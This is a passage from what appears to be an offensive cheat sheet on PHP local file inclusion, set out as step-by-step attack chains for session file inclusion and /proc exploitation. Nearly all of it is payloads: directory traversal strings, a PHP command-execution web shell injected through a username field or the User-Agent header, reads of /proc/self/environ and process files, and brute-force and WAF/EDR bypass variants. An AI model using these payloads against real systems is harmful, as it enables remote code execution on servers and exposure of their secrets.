?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
# Combined use
```

---

### Session file inclusion  `lfi-session`
Use Session files for LFI attacks
Sub-category: **Session inclusion** · tags: `lfi` `session` `file` `inclusion`

**Prerequisites:** an LFI vulnerability exists; the Session content can be controlled; the Session path is known

**Attack chain:**

**1. 1. Probe the Session path**
_Probe the Session storage path_
```
# Linux default paths
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php7/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/c:/windows/temp/sess_[PHPSESSID]
```

**2. 2. Control the Session content**
_Control the Session content_
```
# Control the Session via user input
# e.g. username, bio, etc.
username: <?php system($_GET['c']); ?>

# Or via Cookie
Set-Cookie: PHPSESSID=malicious
```

**3. 3. Include the Session file**
_Include the Session file to execute code_
```
# Include the Session file
?file=/var/lib/php/sessions/sess_abc123&c=id

# Or use a relative path
?file=../../../var/lib/php/sessions/sess_abc123&c=id
```

**4. 4. Session race condition**
_Exploit a Session race condition_
```
# Exploit a Session race
# 1. Continuously write malicious code to the Session
# 2. Simultaneously include the Session file
# 3. Execute before the Session is cleaned up
```

**WAF/EDR bypass variants:**

**1. Session ID prediction**
_Predict the Session ID_
```
# Try to predict the Session ID
# Common pattern: md5(ip.time.random)
# Brute-force enumerate the Session ID
```

---

### Proc file system exploitation  `lfi-proc`
Use the /proc file system for LFI attacks
Sub-category: **Proc file system** · tags: `lfi` `proc` `linux` `environ`

**Prerequisites:** an LFI vulnerability exists; a Linux system; /proc is accessible

**Attack chain:**

**1. 1. Read process information**  _[linux]_
_Read current process information_
```
# Current process info
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

**2. 2. Read environment variables**  _[linux]_
_Read environment variables to execute code_
```
?file=../../../proc/self/environ

# Inject into User-Agent
User-Agent: <?php system($_GET['c']); ?>

# Include and execute
?file=../../../proc/self/environ&c=id
```

**3. 3. Read logs via fd**  _[linux]_
_Read logs via fd_
```
# fd file descriptors
/proc/self/fd/10
/proc/self/fd/20

# Try different numbers to find the log
?file=../../../proc/self/fd/10
```

**4. 4. Read other processes**  _[linux]_
_Read other process information_
```
# Enumerate processes
/proc/[pid]/cmdline
/proc/[pid]/environ
/proc/[pid]/maps

# Brute-force enumerate
?file=../../../proc/1/cmdline
?file=../../../proc/2/cmdline
```

**WAF/EDR bypass variants:**

**1. Use self**  _[linux]_
_Use the self reference_
```
?file=/proc/self/environ
?file=proc/self/environ
```

---
